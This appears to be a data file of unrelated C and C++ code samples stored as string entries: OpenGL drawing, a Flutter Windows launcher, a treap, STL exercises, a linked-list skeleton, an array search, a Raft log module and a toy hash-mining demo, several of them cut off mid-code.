glBegin(GL_LINE_LOOP);\r\n\tglColor3f(1,0,0);\r\n\tglVertex3f(0.2,2.5,1);\r\n\tglVertex3f(0.1,2.3,1);\r\n\tglVertex3f(2.1,1.1,1);\r\n\tglVertex3f(2.3,1.2,1);\r\n\tglEnd();\r\nglPopMatrix();\r\n}\r\n\r\nvoid rack(float x1, float x2)\r\n{\r\nglPushMatrix();\r\n\tglScaled(0.35,.05,1.0);\r\n\tglTranslatef(x1,x2,0.1);\r\n\tglColor3f(0,0,0.3);\r\n\tglutSolidCube(1.1);\r\n\tglPopMatrix();\r\n}\r\n\r\nvoid rack1(float x1, float x2)\r\n{\r\nglPushMatrix();\r\n\tglScaled(1.75,.1,1.0);\r\n\tglTranslatef(x1,x2,0.3);\r\n\tglColor3f(0,0,1.3);\r\n\tglutSolidCube(0.5);\r\n\tglPopMatrix();\r\n}\r\n\r\nvoid window(float x1, float x2)\r\n{\r\nglPushMatrix();\r\n\tglScaled(0.5,.3,1.0);\r\n\tglTranslatef(x1,x2,0.4);\r\n\tglColor3f(0.1,0.1,0.1);\r\n\tglutSolidCube(0.5);\r\n\tglPopMatrix();\r\n}\r\n\r\nvoid top()\r\n{\r\nglBegin(GL_TRIANGLES);\r\n    \r\n    /* Front */\r\n    glColor3f(1.0f,1.0f,1.0f);\r\n    glVertex3f( 0.0f, 1.0f, 0.0f);\r\n    glColor3f(1.0f,1.0f,1.0f);\r\n    glVertex3f(-0.5f,-0.5f, 0.5f);\r\n    glColor3f(1.0f,1.0f,1.0f);\r\n    glVertex3f( 0.5f,-0.5f, 0.5f);\r\n \r\n    /* Left */\r\n    glColor3f(1.0f,1.0f,1.0f);\r\n    glVertex3f(0.0f,1.0f,0.0f);\r\n    glColor3f(1.0f,1.0f,1.0f);\r\n    glVertex3f(-0.5f,-0.5f,0.5f);\r\n    glColor3f(1.0f,1.0f,1.0f);\r\n    glVertex3f(-0.5f,-0.5,-0.5f);\r\n        \r\n    /* Right */\r\n    glColor3f(1.0f,1.0f,1.0f);\r\n    glVertex3f(0.0f,1.0f,0.0f);\r\n    glColor3f(1.0f,1.0f,1.0f);\r\n    glVertex3f(0.5f,-0.5f,0.5f);\r\n    glColor3f(1.0f,1.0f,1.0f);\r\n\tglVertex3f(0.5f,-0.5,-0.5f);\r\n                \r\n    /* Back */\r\n    glColor3f(1.0f,1.0f,1.0f);\r\n    glVertex3f( 0.0f, 1.0f, 0.0f);\r\n    glColor3f(1.0f,1.0f,1.0f);\r\n    glVertex3f(-0.5f,-0.5f, -0.5f);\r\n    glColor3f(1.0f,1.0f,1.0f);\r\n    glVertex3f( 0.5f,-0.5f, -0.5f);\r\n    glEnd();\r\n}\r\n\r\nvoid animate();\r\n\r\nvoid network()\r\n{\r\n   glClearColor(0.0,0,0,0.0);\r\n  //glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);\r\n  \tglLoadIdentity();\r\n    glTranslatef(0.0f,0.0f,-13.0f);\r\n  \r\n\t// glRotatef(ang,1.0f,1.0f,0.0f);   \r\n\t\r\n\t//Server\r\n\tglPushMatrix();\r\n\tglScaled(0.8,2.0,0.8);\r\n\tglTranslatef(5,0.8,0.0);\r\n\tglColor3f(0,1.5,1.5);\r\n\tglutSolidCube(1);\r\n\t\r\n\tglPushMatrix();\r\n\tglScaled(0.5,.1,1.0);\r\n\tglTranslatef(.0,3.5,0.01);\r\n\tglColor3f(0.3,0.3,0.3);\r\n\tglutSolidCube(1.5);\r\n\tglPopMatrix();\r\n\r\n\track1(.0,1);\r\n\track1(.0,2);\r\n\track1(.0,0);\r\n\t\r\n\track(-1,-4);\r\n\track(1,-4);\r\n\track(-1,-6);\r\n\track(1,-6);\r\n\track(-1,-8);\r\n\track(1,-8);\r\n\t\r\n\tglPopMatrix();\r\n\r\n\t//Home\r\n\tglPushMatrix();\r\n\tglScaled(0.8,1.0,0.8);\r\n\tglTranslatef(4.8,-2.5,0.0);\r\n\tglColor3f(1,1,0);\r\n\tglutSolidCube(1);\r\n\t\r\n\r\n\tglPushMatrix();\r\n\tglScaled(.7,.1,1.0);\r\n\tglTranslatef(0.0,4.5,0.2);\r\n\tglColor3f(1.3,1.3,1.3);\r\n\tglutSolidCube(1.5);\r\n\tglPopMatrix();\r\n\r\n\t\r\n\tglPushMatrix();\r\n\tglScaled(0.12,.3,.75);\r\n\tglTranslatef(0,-.75,0.02);\r\n\tglColor3f(0.3,0.3,0.3);\r\n\tglutSolidCube(1.5);\r\n\tglPopM",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"prototipo2\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include<bits/stdc++.h>\r\n#include<random>\r\nusing namespace std;\r\nrandom_device rd;\r\nunsigned int seed=rd();\r\nmt19937 rg(rd());\r\nstruct Treap{\r\n    Treap *l=nullptr,*r=nullptr;\r\n    int v,size,pri;\r\n    bool alive;\r\n    Treap(int x): size(1),pri(rg()),v(x) {};\r\n    void pull();\r\n    void push();\r\n};\r\nvoid Treap::pull(){\r\n    size=1;\r\n    if(l!=nullptr) {\r\n        size+=l->size;\r\n    }\r\n    if(r!=nullptr) {\r\n        size+=r->size;\r\n    }\r\n    return;\r\n}\r\nvoid Treap::push(){\r\n    if(l!=nullptr){\r\n        l->v=v;\r\n        l->push();\r\n    }\r\n    if(r!=nullptr){\r\n        r->v=v;\r\n        r->push();\r\n    }\r\n}\r\nint size(Treap *a){\r\n    if(a==nullptr) return 0;\r\n    return a->size;\r\n}\r\nTreap *merge(Treap *a,Treap *b){\r\n    if(a==nullptr) return b;\r\n    if(b==nullptr) return a;\r\n    if(a->pri<b->pri){\r\n        a->r=merge(a->r,b);\r\n        a->pull();\r\n        return a;\r\n    }else{\r\n        b->l=merge(a,b->l);\r\n        b->pull();\r\n        return b;\r\n    }\r\n}\r\nvoid split_by_val(Treap *p,Treap *&a,Treap *&b,int val){\r\n    if(p==nullptr){\r\n        a=b=nullptr;\r\n        return ;\r\n    }\r\n    if(p->v<val){\r\n        a=p;\r\n        split_by_val(p->r,a->r,b,val);\r\n        a->pull();\r\n    }else{\r\n        b=p;\r\n        split_by_val(p->l,a,b->l,val);\r\n        b->pull();\r\n    }\r\n}\r\nvoid split(Treap *p,Treap *&a,Treap *&b,int k){\r\n    if(p==nullptr) {\r\n        a=b=nullptr;\r\n        return;\r\n    }\r\n    if(size(p->l)<k){\r\n        a=p;\r\n        split(p->r,a->r,b,k-size(p->l)-1);\r\n        a->pull();\r\n    }else{\r\n        b=p;\r\n        split(p->l,a,b->l,k);\r\n        b->pull();\r\n    }\r\n}\r\nvoid erase(Treap *&root,int x){\r\n    Treap *a,*b,*c,*temp;\r\n    split_by_val(root,a,b,x);\r\n    split_by_val(b,b,c,x+1);\r\n    split(b,temp,b,1);\r\n    delete temp;\r\n    root=merge(merge(a,b),c);\r\n}\r\nvoid *insrt(Treap *&root,int k){\r\n    Treap *l,*r;\r\n    split_by_val(root ,l,r,k);\r\n    root=merge(merge(l,new Treap(k)),r);\r\n}\r\nvoid query(Treap *&root);",
    "#include <iostream>\n#include <vector>\n#include <deque>\n#include <list>\n#include <algorithm>\n#include <fstream>\n#include <iterator>\n#include <string>\n#include <numeric>\n\nusing namespace std;\n\nvoid task1();\nvoid task2();\nvoid task3();\nvoid task4();\nvoid task5();\nvoid task6();\nvoid task7();\nvoid task8();\n\nvoid displayMenu() {\n    cout << \"\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u0437\u0430\u0434\u0430\u0447\u0443 (1-8, 0 \u0434\u043b\u044f \u0432\u044b\u0445\u043e\u0434\u0430): \";\n}\n\nint main() {\n    int choice;\n    do {\n        displayMenu();\n        cin >> choice;\n\n        switch (choice) {\n            case 1: task1(); break;\n            case 2: task2(); break;\n            case 3: task3(); break;\n            case 4: task4(); break;\n            case 5: task5(); break;\n            case 6: task6(); break;\n            case 7: task7(); break;\n            case 8: task8(); break;\n            default: if (choice != 0) cout << \"\u041d\u0435\u0432\u0435\u0440\u043d\u044b\u0439 \u0432\u044b\u0431\u043e\u0440. \u041f\u043e\u043f\u0440\u043e\u0431\u0443\u0439\u0442\u0435 \u0435\u0449\u0435 \u0440\u0430\u0437.\" << endl; break;\n        }\n    } while (choice != 0);\n\n    return 0;\n}\n\ntemplate <typename T>\nvoid inputContainer(T& container, const string& prompt) {\n    cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u044b \u0434\u043b\u044f \" << prompt << \" (\u0437\u0430\u043a\u043e\u043d\u0447\u0438\u0442\u0435 \u0432\u0432\u043e\u0434 \u043b\u044e\u0431\u044b\u043c \u043d\u0435\u0447\u0438\u0441\u043b\u043e\u0432\u044b\u043c \u0441\u0438\u043c\u0432\u043e\u043b\u043e\u043c): \";\n    typename T::value_type element;\n    while (cin >> element) {\n        container.push_back(element);\n    }\n    cin.clear();  // \u041e\u0447\u0438\u0449\u0430\u0435\u043c \u0441\u043e\u0441\u0442\u043e\u044f\u043d\u0438\u0435 \u043f\u043e\u0442\u043e\u043a\u0430\n    cin.ignore(numeric_limits<streamsize>::max(), '\\n');  // \u0418\u0433\u043d\u043e\u0440\u0438\u0440\u0443\u0435\u043c \u043e\u0441\u0442\u0430\u0432\u0448\u0438\u0435\u0441\u044f \u0441\u0438\u043c\u0432\u043e\u043b\u044b\n}\n\nvoid task1() {\n    vector<int> V;\n    deque<int> D;\n    list<int> L;\n\n    inputContainer(V, \"vector\");\n    inputContainer(D, \"deque\");\n    inputContainer(L, \"list\");\n\n    if (V.size() < 3 || D.size() < 3 || L.size() < 3) {\n        cout << \"\u041d\u0435\u0434\u043e\u0441\u0442\u0430\u0442\u043e\u0447\u043d\u043e \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u043e\u0432 (\u043c\u0438\u043d\u0438\u043c\u0443\u043c 3)\" << endl;\n        return;\n    }\n    \n    if (V.size() % 2 == 0|| D.size() % 2 == 0 || L.size() % 2 == 0) {\n        cout << \"\u042f\u0432\u043b\u044f\u0435\u0442\u0441\u044f \u0447\u0451\u0442\u043d\u044b\u043c\" << endl;\n        return;\n    }\n    \n    auto modify = [](auto &container) {\n        int size = container.size();\n        container.front() *= 2;\n        auto middleIt = next(container.begin(), size / 2);\n        *middleIt *= 2;\n        container.back() *= 2;\n    };\n\n    modify(V);\n    modify(D);\n    modify(L);\n\n    cout << \"\u0418\u0437\u043c\u0435\u043d\u0435\u043d\u043d\u044b\u0439 \u0432\u0435\u043a\u0442\u043e\u0440: \";\n    for (const auto &e : V) cout << e << \" \";\n    cout << \"\\n\u0418\u0437\u043c\u0435\u043d\u0435\u043d\u043d\u044b\u0439 \u0434\u0435\u043a: \";\n    for (const auto &e : D) cout << e << \" \";\n    cout << \"\\n\u0418\u0437\u043c\u0435\u043d\u0435\u043d\u043d\u044b\u0439 \u0441\u043f\u0438\u0441\u043e\u043a: \";\n    for (const auto &e : L) cout << e << \" \";\n    cout << endl;\n}\n\nvoid task2() {\n    list<int> L;\n    inputContainer(L, \"list\");\n\n    if (L.size() % 3 != 0) {\n        cout << \"\u041d\u0435 \u0434\u0435\u043b\u0438\u0442\u0441\u044f \u043d\u0430 3\" << endl;\n        return;\n    }\n\n    int thirdSize = L.size() / 3;\n    auto it = L.begin();\n    advance(it, thirdSize);\n    list<int> firstThird(it, next(it, thirdSize));\n    L.insert(L.end(), firstThird.rbegin(), firstThird.rend());\n\n    cout << \"\u0421\u043f\u0438\u0441\u043e\u043a \u043f\u043e\u0441\u043b\u0435 \u0434\u043e\u0431\u0430\u0432\u043b\u0435\u043d\u0438\u044f \u043f\u0435\u0440\u0432\u043e\u0439 \u0442\u0440\u0435\u0442\u0438 \u0432 \u043e\u0431\u0440\u0430\u0442\u043d\u043e\u043c \u043f\u043e\u0440\u044f\u0434\u043a\u0435: \";\n    for (const auto &e : L) cout << e << \" \";\n    cout << endl;\n}\n\nvoid task3() {\n    deque<int> D;\n    inputContainer(D, \"deque\");\n\n    if (D.size() % 4 != 0) {\n        cout << \"\u0414\u0435\u043a \u043d\u0435 \u043a\u0440\u0430\u0442\u0435\u043d 4\" << endl;\n        return;\n    }\n\n    int halfSize = D.size() / 2;\n\n    // \u0421\u043e\u0437\u0434\u0430\u0435\u043c \u043a\u043e\u043f\u0438\u044e \u043e\u0440\u0438\u0433\u0438\u043d\u0430\u043b\u044c\u043d\u043e\u0433\u043e \u0434\u0435\u043a\u0430\n    deque<int> temp = D;\n\n    // \u0423\u0434\u0430\u043b\u044f\u0435\u043c \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u044b \u0441 \u0447\u0435\u0442\u043d\u044b\u043c\u0438 \u043f\u043e\u0440\u044f\u0434\u043a\u043e\u0432\u044b\u043c\u0438 \u043d\u043e\u043c\u0435\u0440\u0430\u043c\u0438\n    for (int i = 0; i < halfSize; ++i) {\n        if (temp[i] % 2 == 0) {\n            temp.erase(temp.begin() + i);\n            --i; // \u0421\u043c\u0435\u0449\u0430\u0435\u043c \u0438\u043d\u0434\u0435\u043a\u0441, \u0442\u0430\u043a \u043a\u0430\u043a \u0443\u0434\u0430\u043b\u0438\u043b\u0438 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\n        }\n    }\n\n    // \u041f\u0440\u0438\u0441\u0432\u0430\u0438\u0432\u0430\u0435\u043c \u0438\u0437\u043c\u0435\u043d\u0435\u043d\u0438\u044f \u043e\u0431\u0440\u0430\u0442\u043d\u043e \u043e\u0440\u0438\u0433\u0438\u043d\u0430\u043b\u044c\u043d\u043e\u043c\u0443 \u0434\u0435\u043a\u0443\n    D.clear();\n    D.insert(D.end(), temp.begin(), temp.end());\n\n    cout << \"\u0414\u0435\u043a \u043f\u043e\u0441\u043b\u0435 \u0443\u0434\u0430\u043b\u0435\u043d\u0438\u044f: \";\n    for (const auto &e : D) cout << e << \" \";\n    cout << endl;\n}\n\nvoid task4() {\n    vector<int> numbers;\n    string filename;\n    cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u044b \u0434\u043b\u044f \u0437\u0430\u043f\u0438\u0441\u0438 \u0432 \u0444\u0430\u0439\u043b: \";\n    inputContainer(numbers, \"vector\");\n    cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0438\u043c\u044f \u0444\u0430\u0439\u043b\u0430 \u0434\u043b\u044f \u0437\u0430\u043f\u0438\u0441\u0438: \";\n    cin >> filename;\n\n    ofstream outFile(filename);\n\n    // \u0417\u0430\u043c\u0435\u043d\u044f\u0435\u043c \u0432\u0441\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044f 0 \u043d\u0430 10 \u0438 \u0434\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u043c \u043f\u0440\u043e\u0431\u0435\u043b\u044b\n    replace_copy_if(numbers.begin(), numbers.end(),\n                     ostream_iterator<int>(outFile, \" \"),\n                     [](int x) { return x == 0; },\n                     10);\n\n    outFile.close();\n\n    cout << \"\u0414\u0430\u043d\u043d\u044b\u0435 \u0437\u0430\u043f\u0438\u0441\u0430\u043d\u044b \u0432 \u0444\u0430\u0439\u043b \" << filename << endl;\n}\n\n\nvoid task5() {\n    int K;\n    vector<int> V;\n\n    cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u043f\u043e\u0434\u0440\u044f\u0434 \u0438\u0434\u0443\u0449\u0438\u0445 \u043d\u0443\u043b\u0435\u0439 \u0434\u043b\u044f \u0443\u0434\u0430\u043b\u0435\u043d\u0438\u044f: \";\n    cin >> K;\n    inputContainer(V, \"vector\");\n\n    auto it = search_n(V.rbegin(), V.rend(), K, 0);\n    if (it != V.rend()) {\n        V.erase((it + K).base(), it.base());\n    }\n\n    cout << \"\u0412\u0435\u043a\u0442\u043e\u0440 \u043f\u043e\u0441\u043b\u0435 \u0443\u0434\u0430\u043b\u0435\u043d\u0438\u044f: \";\n    for (const auto &e : V) cout << e << \" \";\n    cout << endl;\n}\n\nvoid task6() {\n    list<int> L1, L2;\n    inputContainer(L1, \"L1 (list)\");\n\n    inputContainer(L2, \"L2 (list)\");\n\n    if (L1.size() % 4 != 0 || L2.size() % 4 != 0) {\n        cout << \"\u041d\u0435\u0434\u043e\u0441\u0442\u0430\u0442\u043e\u0447\u043d\u043e \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u043e\u0432 (\u043a\u0430\u0436\u0434\u044b\u0439 \u0434\u043e\u043b\u0436\u0435\u043d \u0441\u043e\u0434\u0435\u0440\u0436\u0430\u0442\u044c \u043c\u0438\u043d\u0438\u043c\u0443\u043c 4)\" << endl;\n        return;\n    }\n\n    auto mid1 = next(L1.begin(), L1.size() / 2);\n    auto mid2 = next(L2.begin(), L2.size() / 2);\n\n    reverse(L1.begin(), mid1);\n    reverse(mid2, L2.end(",
    "/* Program of double linked list */\n#include <iostream>\n#include <cstdlib>\n\nusing namespace std;\n\nclass Node\n{\npublic:\n    int data;\n    Node *prev;\n    Node *next;\n\n    Node(int value)\n    {\n\n        data = value;\n        prev = nullptr;\n        next = nullptr;\n    }\n};\n\nclass DoubleLinkedList\n{\nprivate:\n    Node *head;\n    Node *tail;\n\npublic:\n    DoubleLinkedList()\n    {\n        head = nullptr;\n        tail = nullptr;\n    }\n\n    void CreateList()\n    {\n        DoubleLinkedList();\n\n        int number_of_node, data = 0;\n\n        cout << \"Enter the number of nodes : \";\n        cin >> number_of_node;\n\n        if (number_of_node == 0)\n            return;\n\n        cout << \"Please enter the 1 element to be inserted: \";\n        cin >> data;\n\n        AddAtBeginning(data);\n\n        for (int i = 2; i <= number_of_node; i++)\n        {\n            cout << \"Please enter the \" << i << \" element to be inserted: \";\n            cin >> data;\n\n            AddAtEnd(data);\n        }\n    }\n\n    void Display()\n    {\n        if (head == nullptr)\n        {\n            cout << \"List is empty!!!\" << endl;\n            return;\n        }\n\n        Node *temp = head;\n\n        cout << \"List: \";\n\n        while (temp != nullptr)\n        {\n            cout << temp->data << \"->\";\n            temp = temp->next;\n        }\n\n        cout << \"NULL\" << endl;\n    }\n\n    int Count()\n    {\n        int count = 0;\n\n        return count;\n    }\n\n    bool Search(int search)\n    {\n        return false;\n    }\n\n    void AddAtBeginning(int value)\n    {\n        Node *new_node = new Node(value);\n\n        if (head == nullptr)\n        {\n            head = tail = new_node;\n            return;\n        }\n\n        new_node->next = head;\n        head->prev = new_node;\n        head = new_node;\n    }\n\n    void AddAtEnd(int value)\n    {\n        Node *new_node = new Node(value);\n\n        if (head == nullptr)\n        {\n            head = tail = new_node;\n            return;\n        }\n\n        tail->next = new_node;\n        new_node->prev = tail;\n        tail = new_node;\n    }\n\n    void AddAfterNode(int value, int item)\n    {\n    }\n\n    void AddBeforeNode(int value, int item)\n    {\n    }\n\n    void AddAtPosition(int value, int pos)\n    {\n    }\n\n    void Delete(int value)\n    {\n    }\n\n    void Reverse()\n    {\n    }\n};\n\nint main()\n{\n    int choice, data, item, pos, search = 0;\n    DoubleLinkedList linked_list;\n\n    while (1)\n    {\n        choice, data, item, pos, search = 0;\n        system(\"cls\");\n\n        cout << \"1. Create empty list\" << endl;\n        cout << \"2. Display\" << endl;\n        cout << \"3. Count\" << endl;\n        cout << \"4. Search\" << endl;\n        cout << \"5. Add at beginning\" << endl;\n        cout << \"6. Add to end\" << endl;\n        cout << \"7. Add after node\" << endl;\n        cout << \"8. Add before node\" << endl;\n        cout << \"9. Add at position\" << endl;\n        cout << \"10. Delete\" << endl;\n        cout << \"11. Reverse\" << endl;\n        cout << \"12. Quit\" << endl;\n\n        cout << \"Enter your choice: \";\n        cin >> choice;\n\n        switch (choice)\n        {\n        case 1:\n            linked_list.CreateList();\n            break;\n\n        case 2:\n            linked_list.Display();\n            break;\n\n        case 3:\n            cout << \"Total number of nodes: \" << linked_list.Count() << endl;\n            break;\n\n        case 4:\n            cout << \"Enter element to search: \";\n            cin >> search;\n            cout << (linked_list.Search(search) ? \"Element found\" : \"Element not found\") << endl;\n            break;\n\n        case 5:\n            cout << \"Enter the element to add at beginning: \";\n            cin >> data;\n            linked_list.AddAtBeginning(data);\n            break;\n\n        case 6:\n            cout << \"Enter the element to add at end: \";\n            cin >> data;\n            linked_list.AddAtEnd(data);\n            break;\n\n        case 7:\n            cout << \"Enter the element to add: \";\n            cin >> data;\n            cout << \"Enter the node after which to add: \";\n            cin >> item;\n            linked_list.AddAfterNode(data, item);\n            break;\n\n        case 8:\n            cout << \"Enter the element to add: \";\n            cin >> data;\n            cout << \"Enter the node after which to before: \";\n            cin >> item;\n            linked_list.AddBeforeNode(data, item);\n            break;\n\n        case 9:\n            cout << \"Enter the element to add: \";\n            cin >> data;\n            cout << \"Enter the position to add: \";\n            cin >> pos;\n            linked_list.AddAtPosition(data, pos);\n            break;\n\n        case 10:\n            cout << \"Enter the element to delete: \";\n            cin >> data;\n            linked_list.Delete(data);\n            break;\n\n        case 11:\n            linked_list.Reverse();\n            break;\n\n        case 12:\n            exit(1);\n            break;\n\n        default:\n            cout << \"Wrong choice!!!\" << endl\n                 << endl;\n            break;\n        }\n\n   ",
    "#include <iostream>\r\nusing namespace std;\r\n\r\nint main (){\r\n    int n;\r\n    cout << \"Masukan nilai array: \";\r\n    cin >> n;\r\n\r\n    int arr[n];\r\n\r\n    cout << \"Masukan \" << n << \" angka:\" << endl;\r\n    for (int i = 0; i < n; i++) {\r\n        cin >> arr[i];\r\n    }\r\n\r\n    int max = arr[0];\r\n    for (int i = 1; i < n; i++) {\r\n        if (arr[i] > max) {\r\n            max = arr[i];\r\n        }\r\n    }\r\n    cout << \"Nilai tertinggi dalam array adalah \" << max << endl;\r\n\r\n\r\n    char pilihan;\r\n    do {\r\n        int cari;\r\n        cout << \"Masukkan angka yang ingin diperiksa: \";\r\n        cin >> cari;\r\n\r\n        bool found = false;\r\n        for (int i = 0; i < n; i++) {\r\n            if (arr[i] == cari) {\r\n                cout << \"Angka \" << cari << \" ditemukan di indeks ke-\" << i << endl;\r\n                found = true;\r\n            }\r\n        }\r\n\r\n        if (!found) {\r\n            cout << \"Angka \" << cari << \" tidak ditemukan dalam array.\" << endl;\r\n        }\r\n\r\n        cout << \"Ingin mencari angka lain? (y/n): \";\r\n        cin >> pilihan;\r\n\r\n    } while (pilihan == 'y' || pilihan == 'Y');\r\n\r\n    return 0;\r\n}\r\n",
    "#include <raft-kv/raft/raft_log.h>\n#include <raft-kv/common/log.h>\n#include <raft-kv/raft/util.h>\n\nnamespace kv {\n\nRaftLog::RaftLog(StoragePtr storage, uint64_t max_next_ents_size)\n    : storage_(std::move(storage)),\n      committed_(0),\n      applied_(0),\n      max_next_ents_size_(max_next_ents_size) {\n  assert(storage_);\n  uint64_t first;\n  auto status = storage_->first_index(first);\n  assert(status.is_ok());\n\n  uint64_t last;\n  status = storage_->last_index(last);\n  assert(status.is_ok());\n\n  unstable_ = std::make_shared<Unstable>(last + 1);\n\n  // Initialize our committed and applied pointers to the time of the last compaction.\n  applied_ = committed_ = first - 1;\n}\nRaftLog::~RaftLog() {\n\n}\n\nvoid RaftLog::maybe_append(uint64_t index,\n                           uint64_t log_term,\n                           uint64_t committed,\n                           std::vector<proto::EntryPtr> entries,\n                           uint64_t& last_new_index,\n                           bool& ok) {\n  if (match_term(index, log_term)) {\n    uint64_t lastnewi = index + entries.size();\n    uint64_t ci = find_conflict(entries);\n    if (ci == 0) {\n      //no conflict\n    } else if (ci <= committed_) {\n      LOG_FATAL(\"entry %lu conflict with committed entry [committed(%lu)]\", ci, committed_);\n    } else {\n      assert(ci > 0);\n      uint64_t offset = index + 1;\n      uint64_t n = ci - offset;\n      entries.erase(entries.begin(), entries.begin() + n);\n      append(std::move(entries));\n    }\n\n    commit_to(std::min(committed, lastnewi));\n\n    last_new_index = lastnewi;\n    ok = true;\n    return;\n  } else {\n    last_new_index = 0;\n    ok = false;\n  }\n}\n\nuint64_t RaftLog::append(std::vector<proto::EntryPtr> entries) {\n  if (entries.empty()) {\n    return last_index();\n  }\n\n  uint64_t after = entries[0]->index - 1;\n  if (after < committed_) {\n    LOG_FATAL(\"after(%lu) is out of range [committed(%lu)]\\\", after, committed_\", after, committed_);\n  }\n\n  unstable_->truncate_and_append(std::move(entries));\n  return last_index();\n}\n\nuint64_t RaftLog::find_conflict(const std::vector<proto::EntryPtr>& entries) {\n  for (const proto::EntryPtr& entry : entries) {\n    if (!match_term(entry->index, entry->term)) {\n      if (entry->index < last_index()) {\n        uint64_t t;\n        Status status = this->term(entry->index, t);\n        LOG_INFO(\"found conflict at index %lu [existing term: %lu, conflicting term: %lu], %s\",\n                 entry->index,\n                 t,\n                 entry->term,\n                 status.to_string().c_str());\n      }\n      return entry->index;\n    }\n  }\n  return 0;\n}\n\nvoid RaftLog::next_entries(std::vector<proto::EntryPtr>& entries) const {\n  uint64_t off = std::max(applied_ + 1, first_index());\n  if (committed_ + 1 > off) {\n    Status status = slice(off, committed_ + 1, max_next_ents_size_, entries);\n    if (!status.is_ok()) {\n      LOG_FATAL(\"unexpected error when getting unapplied entries\");\n    }\n  }\n}\n\nbool RaftLog::has_next_entries() const {\n  uint64_t off = std::max(applied_ + 1, first_index());\n  return committed_ + 1 > off;\n}\n\nbool RaftLog::maybe_commit(uint64_t max_index, uint64_t term) {\n  if (max_index > committed_) {\n    uint64_t t;\n    this->term(max_index, t);\n    if (t == term) {\n      commit_to(max_index);\n      return true;\n    }\n  }\n  return false;\n}\n\nvoid RaftLog::restore(proto::SnapshotPtr snapshot) {\n  LOG_INFO(\"log starts to restore snapshot [index: %lu, term: %lu]\",\n           snapshot->metadata.index,\n           snapshot->metadata.term);\n  committed_ = snapshot->metadata.index;\n  unstable_->restore(std::move(snapshot));\n}\n\nStatus RaftLog::snapshot(proto::SnapshotPtr& snap) const {\n  if (unstable_->snapshot_) {\n    snap = unstable_->snapshot_;\n    return Status::ok();\n  }\n\n  proto::SnapshotPtr s;\n  Status status = storage_->snapshot(s);\n  if (s) {\n    snap = s;\n  }\n  return status;\n}\n\nvoid RaftLog::applied_to(uint64_t index) {\n  if (index == 0) {\n    return;\n  }\n  if (committed_ < index || index < applied_) {\n    LOG_ERROR(\"applied(%lu) is out of range [prevApplied(%lu), committed(%lu)]\", index, applied_, committed_);\n  }\n  applied_ = index;\n}\n\nStatus RaftLog::slice(uint64_t low, uint64_t high, uint64_t max_size, std::vector<proto::EntryPtr>& entries) const {\n  Status status = must_check_out_of_bounds(low, high);\n  if (!status.is_ok()) {\n    return status;\n  }\n  if (low == high) {\n    return Status::ok();\n  }\n\n  //slice from storage_\n  if (low < unstable_->offset_) {\n    status = storage_->entries(low, std::min(high, unstable_->offset_), max_size, entries);\n    if (!status.is_ok()) {\n      return status;\n    }\n\n    // check if ents has reached the size limitation\n    if (entries.size() < std::min(high, unstable_->offset_) - low) {\n      return Status::ok();\n    }\n\n  }\n\n  //slice unstable\n  if (high > unstable_->offset_) {\n    std::vector<proto::EntryPtr> unstable;\n    unstable_->slice(std::max(low, unstable_->offset_), high, entries);\n    entries.insert(entries.end(), unstable.begin(), unst",
    "#include <iostream>\n#include <string>\n#include <ctime>\n#include <sstream>\n#include <iomanip>\n#include <vector>\n#include <thread>\n#include <mutex>\n#include <atomic>\n\nconst int WIDTH = 60;\nstd::atomic<bool> found(false);  // Variable atomique pour signaler quand un nonce valide est trouv\u00e9\nstd::mutex outputMutex;  // Mutex pour \u00e9viter les conflits d'affichage\n\n// Fonction pour calculer le hash en fonction de l'index, du precedent hash, des donnees et du timestamp\nstd::string calculateHash(int index, const std::string& previousHash, const std::string& data, const std::tm& time, int nonce)\n{\n    std::hash<std::string> hasher;\n    std::stringstream ss;\n    ss << index << previousHash << data << std::put_time(&time, \"%Y-%m-%d %H:%M:%S\") << nonce;\n    size_t hashValue = hasher(ss.str());\n    std::stringstream hexStream;\n    hexStream << std::hex << hashValue;\n    return hexStream.str();\n}\n\n// Fonction de minage par thread\nvoid mineNonce(int index, std::string previousHash, std::string data, std::tm time, int difficulty, int offset, int step, int& validNonce)\n{\n    std::string target(difficulty, '0');\n    int nonce = offset;\n    int attempts = 0;  // Compteur de tentatives\n\n    while (!found)\n    {\n        std::string hash = calculateHash(index, previousHash, data, time, nonce);\n        if (hash.substr(0, difficulty) == target)\n        {\n            found = true;\n            validNonce = nonce;  // Stocke le nonce valide\n            std::lock_guard<std::mutex> lock(outputMutex);\n            std::cout << \"Nonce found: \" << nonce << \" with hash: \" << hash << std::endl;\n            